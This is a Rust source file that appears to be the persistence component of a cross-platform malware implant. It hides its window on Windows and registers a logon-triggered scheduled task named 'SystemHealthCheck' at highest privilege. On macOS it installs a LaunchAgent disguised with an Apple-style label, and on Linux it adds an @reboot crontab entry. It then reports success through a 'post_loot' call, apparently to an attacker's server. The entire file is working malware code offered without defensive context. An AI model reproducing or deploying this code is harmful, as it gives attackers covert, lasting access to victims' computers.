#![cfg_attr(target_os = "windows", windows_subsystem = "windows")]

use agent::transport;
use serde_json::json;

fn main() {
    let installed = install_persistence();
    let payload = json!({
        "timestamp": unix_now(),
        "type": "persist",
        "installed": installed,
    });
    transport::post_loot(&payload);
}

#[cfg(target_os = "windows")]
fn install_persistence() -> bool {
    use std::process::Command;
    let exe = std::env::current_exe()
        .map(|p| p.to_string_lossy().into_owned())
        .unwrap_or_default();
    Command::new("schtasks")
        .args([
            "/create", "/f",
            "/tn", "SystemHealthCheck",
            "/tr", &exe,
            "/sc", "ONLOGON",
            "/rl", "HIGHEST",
        ])
        .output()
        .map(|o| o.status.success())
        .unwrap_or(false)
}

#[cfg(target_os = "macos")]
fn install_persistence() -> bool {
    use std::process::Command;
    let exe = std::env::current_exe()
        .map(|p| p.to_string_lossy().into_owned())
        .unwrap_or_default();
    let home = std::env::var("HOME").unwrap_or_default();
    let plist_path = format!("{home}/Library/LaunchAgents/com.apple.syshealth.plist");
    let plist = format!(
        r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key><string>com.apple.syshealth</string>
  <key>ProgramArguments</key><array><string>{exe}</string></array>
  <key>RunAtLoad</key><true/>
  <key>KeepAlive</key><false/>
</dict>
</plist>"#
    );
    std::fs::write(&plist_path, plist).is_ok()
        && Command::new("launchctl")
            .args(["load", &plist_path])
            .output()
            .map(|o| o.status.success())
            .unwrap_or(false)
}

#[cfg(target_os = "linux")]
fn install_persistence() -> bool {
    use std::io::Write;
    use std::process::{Command, Stdio};
    let exe = std::env::current_exe()
        .map(|p| p.to_string_lossy().into_owned())
        .unwrap_or_default();
    let existing = Command::new("crontab")
        .arg("-l")
        .output()
        .ok()
        .map(|o| String::from_utf8_lossy(&o.stdout).into_owned())
        .unwrap_or_default();
    let new_cron = format!("{existing}@reboot {exe}\n");
    (|| -> Option<bool> {
        let mut child = Command::new("crontab")
            .arg("-")
            .stdin(Stdio::piped())
            .spawn()
            .ok()?;
        child.stdin.as_mut()?.write_all(new_cron.as_bytes()).ok()?;
        drop(child.stdin.take());
        child.wait().ok().map(|s| s.success())
    })()
    .unwrap_or(false)
}

fn unix_now() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0)
}
